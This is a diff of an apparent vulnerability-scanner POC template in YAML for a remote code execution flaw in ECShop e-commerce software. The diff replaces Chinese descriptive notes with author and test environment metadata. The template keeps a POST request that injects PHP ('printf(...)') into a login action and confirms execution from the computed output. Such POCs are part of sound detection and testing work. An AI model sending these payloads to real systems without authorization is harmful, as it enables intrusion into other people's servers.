@@ -1,9 +1,3 @@
-Summary
-ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用
-漏洞分析：
-https://xz.aliyun.com/t/2689
-
-POC
 name: poc-yaml-ecshop-3.6.0-rce
 rules:
   - method: POST
@@ -20,11 +14,6 @@ rules:
     body: action=login&vulnspy=printf(153246879-159);
     follow_redirects: false
     expression: status == 200 && body.bcontains(b'153246720')
-
-
-Test Environment
-https://www.vulnspy.com/cn-ecshop-3.x.x-rce-exploit/
-有在线的实验环境，打开就可以测试了
-
-Remarks
-Write you voice here.
+detail:
+  author: githusky
+  test_env: https://www.vulnspy.com/cn-ecshop-3.x.x-rce-exploit
